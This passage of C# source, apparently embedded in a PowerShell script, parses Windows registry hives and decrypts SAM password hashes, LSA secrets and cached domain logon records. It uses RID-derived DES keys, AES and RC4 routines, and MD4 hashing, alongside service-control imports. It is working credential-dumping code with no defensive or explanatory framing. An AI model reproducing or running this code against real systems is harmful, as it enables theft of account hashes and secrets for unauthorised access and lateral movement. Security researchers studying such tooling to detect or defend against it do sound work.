    public static extern Boolean QueryServiceConfig(IntPtr hService, IntPtr intPtrQueryConfig, int cbBufSize, ref int pcbBytesNeeded);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool QueryServiceStatusEx(IntPtr serviceHandle, int infoLevel, IntPtr buffer, int bufferSize, out int bytesNeeded);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern Boolean ChangeServiceConfig(IntPtr hService, UInt32 nServiceType, UInt32 nStartType, UInt32 nErrorControl, String lpBinaryPathName,
    String lpLoadOrderGroup, IntPtr lpdwTagId, [In] char[] lpDependencies, String lpServiceStartName, String lpPassword, String lpDisplayName);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ControlService(IntPtr hService, uint dwControl, ref uint lpServiceStatus);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseServiceHandle(IntPtr hSCObject);
}

class QueryService {
    public static ServiceInfo serviceInfo;
    public QueryService(IntPtr qscPtr)
    {
        QueryServiceConfigStruct qscs = new QueryServiceConfigStruct();
        qscs = (QueryServiceConfigStruct)
                Marshal.PtrToStructure(qscPtr,
                new QueryServiceConfigStruct().GetType());

        serviceInfo = new ServiceInfo();
        serviceInfo.binaryPathName =
        Marshal.PtrToStringAuto(qscs.binaryPathName);
        serviceInfo.dependencies =
        Marshal.PtrToStringAuto(qscs.dependencies);
        serviceInfo.displayName =
        Marshal.PtrToStringAuto(qscs.displayName);
        serviceInfo.loadOrderGroup =
        Marshal.PtrToStringAuto(qscs.loadOrderGroup);
        serviceInfo.startName =
        Marshal.PtrToStringAuto(qscs.startName);

        serviceInfo.errorControl = qscs.errorControl;
        serviceInfo.serviceType = qscs.serviceType;
        serviceInfo.startType = qscs.startType;
        serviceInfo.tagID = qscs.tagID;

        Marshal.FreeCoTaskMem(qscPtr);
    }

    public string getStartName()
    {
        return serviceInfo.startName;
    }
    public int getStartType()
    {
        return serviceInfo.startType;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct QueryServiceConfigStruct
    {
        public int serviceType;
        public int startType;
        public int errorControl;
        public IntPtr binaryPathName;
        public IntPtr loadOrderGroup;
        public int tagID;
        public IntPtr dependencies;
        public IntPtr startName;
        public IntPtr displayName;
    }
    public struct ServiceInfo
    {
        public int serviceType;
        public int startType;
        public int errorControl;
        public string binaryPathName;
        public string loadOrderGroup;
        public int tagID;
        public string dependencies;
        public string startName;
        public string displayName;
    }
}

public class RegistryHive {
    public string Filepath { get; set; }
    public NodeKey RootKey { get; set; }
    public bool WasExported { get; set; }

    public RegistryHive(BinaryReader reader)
    {
        reader.BaseStream.Position += 4132 - reader.BaseStream.Position;
        this.RootKey = new NodeKey(reader);
    }
}

internal class NL_Record {
    public NL_Record(byte[] inputData)
    {
        userLength = BitConverter.ToInt16(inputData.Take(2).ToArray(), 0);
        domainNameLength = BitConverter.ToInt16(inputData.Skip(2).Take(2).ToArray(), 0);
        dnsDomainLength = BitConverter.ToInt16(inputData.Skip(60).Take(2).ToArray(), 0);
        IV = inputData.Skip(64).Take(16).ToArray();
        encryptedData = inputData.Skip(96).Take(inputData.Length - 96).ToArray();
    }
    public int userLength { get; set; }
    public int domainNameLength { get; set; }
    public int dnsDomainLength { get; set; }
    public byte[] IV { get; set; }
    public byte[] encryptedData { get; set; }
}

public class NodeKey {
    public NodeKey(BinaryReader hive)
    {
        ReadNodeStructure(hive);
        ReadChildrenNodes(hive);
        ReadChildValues(hive);
    }

    public List<NodeKey> ChildNodes { get; set; }
    public List<ValueKey> ChildValues { get; set; }
    public DateTime Timestamp { get; set; }
    public int ParentOffset { get; set; }
    public int SubkeysCount { get; set; }
    public int LFRecordOffset { get; set; }
    public int ClassnameOffset { get; set; }
    public int SecurityKeyOffset { get; set; }
    public int ValuesCount { get; set; }
    public int ValueListOffset { get; set; }
    public short NameLength { get; set; }
    public bool IsRootKey { get; set; }
    public short ClassnameLength { get; set; }
    public string Name { get; set; }
    public byte[] ClassnameData { get; set; }
    public NodeKey ParentNodeKey { get; set; }

    private void ReadNodeStructure(BinaryReader hive)
    {
        byte[] buf = hive.ReadBytes(4);

        if (buf[0] != 0x6e || buf[1] != 0x6b)
            throw new NotSupportedException("Bad nk header");

        long startingOffset = hive.BaseStream.Position;
        this.IsRootKey = (buf[2] == 0x2c) ? true : false;

        this.Timestamp = DateTime.FromFileTime(hive.ReadInt64());

        hive.BaseStream.Position += 4;

        this.ParentOffset = hive.ReadInt32();
        this.SubkeysCount = hive.ReadInt32();

        hive.BaseStream.Position += 4;

        this.LFRecordOffset = hive.ReadInt32();

        hive.BaseStream.Position += 4;

        this.ValuesCount = hive.ReadInt32();
        this.ValueListOffset = hive.ReadInt32();
        this.SecurityKeyOffset = hive.ReadInt32();
        this.ClassnameOffset = hive.ReadInt32();

        hive.BaseStream.Position += (startingOffset + 68) - hive.BaseStream.Position;

        this.NameLength = hive.ReadInt16();
        this.ClassnameLength = hive.ReadInt16();

        buf = hive.ReadBytes(this.NameLength);
        this.Name = System.Text.Encoding.UTF8.GetString(buf);

        hive.BaseStream.Position = this.ClassnameOffset + 4 + 4096;
        this.ClassnameData = hive.ReadBytes(this.ClassnameLength);
    }

    private void ReadChildrenNodes(BinaryReader hive)
    {
        this.ChildNodes = new List<NodeKey>();
        if (this.LFRecordOffset != -1)
        {
            hive.BaseStream.Position = 4096 + this.LFRecordOffset + 4;

            byte[] buf = hive.ReadBytes(2);

            //ri
            if (buf[0] == 0x72 && buf[1] == 0x69)
            {
                int count = hive.ReadInt16();

                for (int i = 0; i < count; i++)
                {
                    long pos = hive.BaseStream.Position;
                    int offset = hive.ReadInt32();
                    hive.BaseStream.Position = 4096 + offset + 4;
                    buf = hive.ReadBytes(2);

                    if (!(buf[0] == 0x6c && (buf[1] == 0x66 || buf[1] == 0x68)))
                        throw new Exception("Bad LF/LH record at: " + hive.BaseStream.Position);

                    ParseChildNodes(hive);

                    hive.BaseStream.Position = pos + 4; //go to next record list
                }
            }
            //lf or lh
            else if (buf[0] == 0x6c && (buf[1] == 0x66 || buf[1] == 0x68))
                ParseChildNodes(hive);
            else
                throw new Exception("Bad LF/LH/RI Record at: " + hive.BaseStream.Position);
        }
    }

    private void ParseChildNodes(BinaryReader hive)
    {
        int count = hive.ReadInt16();
        long topOfList = hive.BaseStream.Position;

        for (int i = 0; i < count; i++)
        {
            hive.BaseStream.Position = topOfList + (i * 8);
            int newoffset = hive.ReadInt32();
            hive.BaseStream.Position += 4;
            //byte[] check = hive.ReadBytes(4);
            hive.BaseStream.Position = 4096 + newoffset + 4;
            NodeKey nk = new NodeKey(hive) { ParentNodeKey = this };
            this.ChildNodes.Add(nk);
        }

        hive.BaseStream.Position = topOfList + (count * 8);
    }

    private void ReadChildValues(BinaryReader hive)
    {
        this.ChildValues = new List<ValueKey>();
        if (this.ValueListOffset != -1)
        {
            hive.BaseStream.Position = 4096 + this.ValueListOffset + 4;

            for (int i = 0; i < this.ValuesCount; i++)
            {
                hive.BaseStream.Position = 4096 + this.ValueListOffset + 4 + (i * 4);
                int offset = hive.ReadInt32();
                hive.BaseStream.Position = 4096 + offset + 4;
                this.ChildValues.Add(new ValueKey(hive));
            }
        }
    }

    public byte[] getChildValues(string valueName)
    {
        ValueKey targetData = this.ChildValues.Find(x => x.Name.Contains(valueName));
        return targetData.Data;
    }
}

public class ValueKey {
    public ValueKey(BinaryReader hive)
    {
        byte[] buf = hive.ReadBytes(2);

        if (buf[0] != 0x76 && buf[1] != 0x6b)
            throw new NotSupportedException("Bad vk header");

        this.NameLength = hive.ReadInt16();
        this.DataLength = hive.ReadInt32();

        byte[] databuf = hive.ReadBytes(4);

        this.ValueType = hive.ReadInt32();
        hive.BaseStream.Position += 4;

        buf = hive.ReadBytes(this.NameLength);
        this.Name = (this.NameLength == 0) ? "Default" : System.Text.Encoding.UTF8.GetString(buf);

        if (this.DataLength < 5)
            this.Data = databuf;
        else
        {
            hive.BaseStream.Position = 4096 + BitConverter.ToInt32(databuf, 0) + 4;
            this.Data = hive.ReadBytes(this.DataLength);
        }
    }

    public short NameLength { get; set; }
    public int DataLength { get; set; }
    public int DataOffset { get; set; }
    public int ValueType { get; set; }
    public string Name { get; set; }
    public byte[] Data { get; set; }
    public string String { get; set; }
}

internal class LsaSecret {
    public LsaSecret(byte[] inputData)
    {
        version = inputData.Take(4).ToArray();
        enc_key_id = inputData.Skip(4).Take(16).ToArray();
        enc_algo = inputData.Skip(20).Take(4).ToArray();
        flags = inputData.Skip(24).Take(4).ToArray();
        data = inputData.Skip(28).ToArray();
    }
    public byte[] version { get; set; }
    public byte[] enc_key_id { get; set; }
    public byte[] enc_algo { get; set; }
    public byte[] flags { get; set; }
    public byte[] data { get; set; }
}

internal class LsaSecretBlob {
    public LsaSecretBlob(byte[] inputData)
    {
        length = BitConverter.ToInt16(inputData.Take(4).ToArray(), 0);
        unk = inputData.Skip(4).Take(12).ToArray();
        secret = inputData.Skip(16).Take(length).ToArray();
    }
    public int length { get; set; }
    public byte[] unk { get; set; }
    public byte[] secret { get; set; }
}

internal static class Crypto {
    //https://rosettacode.org/wiki/MD4
    public static byte[] Md4Hash2(this byte[] input)
    {
        // get padded uints from bytes
        List<byte> bytes = input.ToList();
        uint bitCount = (uint)(bytes.Count) * 8;
        bytes.Add(128);
        while (bytes.Count % 64 != 56) bytes.Add(0);
        var uints = new List<uint>();
        for (int i = 0; i + 3 < bytes.Count; i += 4)
            uints.Add(bytes[i] | (uint)bytes[i + 1] << 8 | (uint)bytes[i + 2] << 16 | (uint)bytes[i + 3] << 24);
        uints.Add(bitCount);
        uints.Add(0);

        // run rounds
        uint a = 0x67452301, b = 0xefcdab89, c = 0x98badcfe, d = 0x10325476;
        Func<uint, uint, uint> rol = (x, y) => x << (int)y | x >> 32 - (int)y;
        for (int q = 0; q + 15 < uints.Count; q += 16)
        {
            var chunk = uints.GetRange(q, 16);
            uint aa = a, bb = b, cc = c, dd = d;
            Action<Func<uint, uint, uint, uint>, uint[]> round = (f, y) =>
            {
                foreach (uint i in new[] { y[0], y[1], y[2], y[3] })
                {
                    a = rol(a + f(b, c, d) + chunk[(int)(i + y[4])] + y[12], y[8]);
                    d = rol(d + f(a, b, c) + chunk[(int)(i + y[5])] + y[12], y[9]);
                    c = rol(c + f(d, a, b) + chunk[(int)(i + y[6])] + y[12], y[10]);
                    b = rol(b + f(c, d, a) + chunk[(int)(i + y[7])] + y[12], y[11]);
                }
            };
            round((x, y, z) => (x & y) | (~x & z), new uint[] { 0, 4, 8, 12, 0, 1, 2, 3, 3, 7, 11, 19, 0 });
            round((x, y, z) => (x & y) | (x & z) | (y & z), new uint[] { 0, 1, 2, 3, 0, 4, 8, 12, 3, 5, 9, 13, 0x5a827999 });
            round((x, y, z) => x ^ y ^ z, new uint[] { 0, 2, 1, 3, 0, 8, 4, 12, 3, 9, 11, 15, 0x6ed9eba1 });
            a += aa; b += bb; c += cc; d += dd;
        }
        // return hex encoded string
        byte[] outBytes = new[] { a, b, c, d }.SelectMany(BitConverter.GetBytes).ToArray();
        return outBytes;
    }

    //https://stackoverflow.com/questions/28613831/encrypt-decrypt-querystring-values-using-aes-256
    public static byte[] DecryptAES_ECB(byte[] value, byte[] key)
    {
        AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
        aes.BlockSize = 128;
        aes.Key = key;
        aes.Mode = CipherMode.ECB;
        aes.Padding = PaddingMode.None;
        using (ICryptoTransform decrypt = aes.CreateDecryptor())
        {
            byte[] dest = decrypt.TransformFinalBlock(value, 0, value.Length);
            return dest;
        }
    }

    public static byte[] DecryptAES_CBC(byte[] value, byte[] key, byte[] iv)
    {
        AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
        aes.BlockSize = 128;
        aes.Key = key;
        aes.Mode = CipherMode.CBC;
        aes.IV = iv;
        //you would think this would work to pad out the rest of the final block to 16, but it doesnt? ¯\_(ツ)_/¯
        aes.Padding = PaddingMode.Zeros;

        int tailLength = value.Length % 16;
        if (tailLength != 0)
        {
            List<byte> manualPadding = new List<byte>();
            for (int i = 16 - tailLength; i > 0; i--)
            {
                manualPadding.Add(0x00);
            }
            byte[] concat = new byte[value.Length + manualPadding.Count];
            System.Buffer.BlockCopy(value, 0, concat, 0, value.Length);
            System.Buffer.BlockCopy(manualPadding.ToArray(), 0, concat, value.Length, manualPadding.Count);
            value = concat;
        }

        using (ICryptoTransform decrypt = aes.CreateDecryptor())
        {
            byte[] dest = decrypt.TransformFinalBlock(value, 0, value.Length);
            return dest;
        }
    }

    public static byte[] ComputeSha256(byte[] key, byte[] value)
    {
        MemoryStream memStream = new MemoryStream();
        memStream.Write(key, 0, key.Length);
        for (int i = 0; i < 1000; i++)
        {
            memStream.Write(value, 0, 32);
        }
        byte[] shaBase = memStream.ToArray();
        using (SHA256 sha256Hash = SHA256.Create())
        {
            byte[] newSha = sha256Hash.ComputeHash(shaBase);
            return newSha;
        }
    }

    //https://stackoverflow.com/questions/7217627/is-there-anything-wrong-with-this-rc4-encryption-code-in-c-sharp
    public static byte[] RC4Encrypt(byte[] pwd, byte[] data)
    {
        int a, i, j, k, tmp;
        int[] key, box;
        byte[] cipher;

        key = new int[256];
        box = new int[256];
        cipher = new byte[data.Length];

        for (i = 0; i < 256; i++)
        {
            key[i] = pwd[i % pwd.Length];
            box[i] = i;
        }
        for (j = i = 0; i < 256; i++)
        {
            j = (j + box[i] + key[i]) % 256;
            tmp = box[i];
            box[i] = box[j];
            box[j] = tmp;
        }
        for (a = j = i = 0; i < data.Length; i++)
        {
            a++;
            a %= 256;
            j += box[a];
            j %= 256;
            tmp = box[a];
            box[a] = box[j];
            box[j] = tmp;
            k = box[((box[a] + box[j]) % 256)];
            cipher[i] = (byte)(data[i] ^ k);
        }
        return cipher;
    }

    //method from SidToKey - https://github.com/woanware/ForensicUserInfo/blob/master/Source/SamParser.cs 
    private static void RidToKey(string hexRid, ref List<byte> key1, ref List<byte> key2)
    {
        int rid = Int32.Parse(hexRid, System.Globalization.NumberStyles.HexNumber);
        List<byte> temp1 = new List<byte>();

        byte temp = (byte)(rid & 0xFF);
        temp1.Add(temp);

        temp = (byte)(((rid >> 8) & 0xFF));
        temp1.Add(temp);

        temp = (byte)(((rid >> 16) & 0xFF));
        temp1.Add(temp);

        temp = (byte)(((rid >> 24) & 0xFF));
        temp1.Add(temp);

        temp1.Add(temp1[0]);
        temp1.Add(temp1[1]);
        temp1.Add(temp1[2]);

        List<byte> temp2 = new List<byte>();
        temp2.Add(temp1[3]);
        temp2.Add(temp1[0]);
        temp2.Add(temp1[1]);
        temp2.Add(temp1[2]);

        temp2.Add(temp2[0]);
        temp2.Add(temp2[1]);
        temp2.Add(temp2[2]);

        key1 = TransformKey(temp1);
        key2 = TransformKey(temp2);
    }

    private static List<byte> TransformKey(List<byte> inputData)
    {
        List<byte> data = new List<byte>();
        data.Add(Convert.ToByte(((inputData[0] >> 1) & 0x7f) << 1));
        data.Add(Convert.ToByte(((inputData[0] & 0x01) << 6 | ((inputData[1] >> 2) & 0x3f)) << 1));
        data.Add(Convert.ToByte(((inputData[1] & 0x03) << 5 | ((inputData[2] >> 3) & 0x1f)) << 1));
        data.Add(Convert.ToByte(((inputData[2] & 0x07) << 4 | ((inputData[3] >> 4) & 0x0f)) << 1));
        data.Add(Convert.ToByte(((inputData[3] & 0x0f) << 3 | ((inputData[4] >> 5) & 0x07)) << 1));
        data.Add(Convert.ToByte(((inputData[4] & 0x1f) << 2 | ((inputData[5] >> 6) & 0x03)) << 1));
        data.Add(Convert.ToByte(((inputData[5] & 0x3f) << 1 | ((inputData[6] >> 7) & 0x01)) << 1));
        data.Add(Convert.ToByte((inputData[6] & 0x7f) << 1));
        return data;
    }

    //from https://github.com/woanware/ForensicUserInfo/blob/master/Source/SamParser.cs 
    private static byte[] DeObfuscateHashPart(byte[] obfuscatedHash, List<byte> key)
    {
        DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();
        cryptoProvider.Padding = PaddingMode.None;
        cryptoProvider.Mode = CipherMode.ECB;
        ICryptoTransform transform = cryptoProvider.CreateDecryptor(key.ToArray(), new byte[] { 0, 0, 0, 0, 0, 0, 0, 0 });
        MemoryStream memoryStream = new MemoryStream(obfuscatedHash);
        CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
        byte[] plainTextBytes = new byte[obfuscatedHash.Length];
        int decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
        return plainTextBytes;
    }

    public static string DecryptSingleHash(byte[] obfuscatedHash, string user)
    {
        List<byte> key1 = new List<byte>();
        List<byte> key2 = new List<byte>();

        RidToKey(user, ref key1, ref key2);

        byte[] hashBytes1 = new byte[8];
        byte[] hashBytes2 = new byte[8];
        Buffer.BlockCopy(obfuscatedHash, 0, hashBytes1, 0, 8);
        Buffer.BlockCopy(obfuscatedHash, 8, hashBytes2, 0, 8);

        byte[] plain1 = DeObfuscateHashPart(hashBytes1, key1);
        byte[] plain2 = DeObfuscateHashPart(hashBytes2, key2);

        return (BitConverter.ToString(plain1) + BitConverter.ToString(plain2));
    }
}
'@
